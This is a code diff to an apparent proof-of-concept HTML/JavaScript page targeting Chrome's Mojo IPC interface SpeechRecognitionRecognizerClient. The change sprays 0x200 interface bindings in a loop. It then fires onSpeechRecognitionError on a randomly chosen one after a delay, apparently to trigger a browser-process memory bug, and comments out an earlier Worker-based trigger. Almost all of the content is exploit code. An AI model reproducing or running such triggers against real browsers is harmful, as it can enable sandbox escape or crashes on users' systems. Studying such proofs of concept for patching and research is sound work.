@@ -36,25 +36,33 @@
 
       let ptr;
       let ptr2;
+      let arr_ptr = new Array();
 
       function trigger()
-      {        
-        ptr = new media.mojom.SpeechRecognitionRecognizerClientPtr();
-        Mojo.bindInterface(media.mojom.SpeechRecognitionRecognizerClient.name, mojo.makeRequest(ptr).handle);
-        mylog('media.mojom.SpeechRecognitionRecognizerClient 1');
+      {
+        for(let i=0; i<0x200; i++) {
+          arr_ptr[i] = new media.mojom.SpeechRecognitionRecognizerClientPtr();
+          Mojo.bindInterface(media.mojom.SpeechRecognitionRecognizerClient.name, mojo.makeRequest(arr_ptr[i]).handle);
 
-        ptr2 = new media.mojom.SpeechRecognitionRecognizerClientPtr();
-        Mojo.bindInterface(media.mojom.SpeechRecognitionRecognizerClient.name, mojo.makeRequest(ptr2).handle);
+          mylog('media.mojom.SpeechRecognitionRecognizerClient');
+        }
 
-        mylog('media.mojom.SpeechRecognitionRecognizerClient 2');        
+        kill();
+
+        // ptr = new media.mojom.SpeechRecognitionRecognizerClientPtr();
+        // Mojo.bindInterface(media.mojom.SpeechRecognitionRecognizerClient.name, mojo.makeRequest(ptr).handle);
+        // mylog('media.mojom.SpeechRecognitionRecognizerClient 1');
+
+        // ptr2 = new media.mojom.SpeechRecognitionRecognizerClientPtr();
+        // Mojo.bindInterface(media.mojom.SpeechRecognitionRecognizerClient.name, mojo.makeRequest(ptr2).handle);
+        // mylog('media.mojom.SpeechRecognitionRecognizerClient 2');        
       }
 
       function kill()
       {
-        // setTimeout(()=> { ptr.onSpeechRecognitionError(); }, 10000);
-        var work = new Worker('worker.js');
-        work.postMessage(ptr);
-        work.terminate();
+        let x = Math.floor(Math.random() * 500);
+        mylog(x);
+        setTimeout(()=> { arr_ptr[x].onSpeechRecognitionError(); }, 300);
       }
 
       document.getElementById("myBtn").addEventListener("click", trigger);
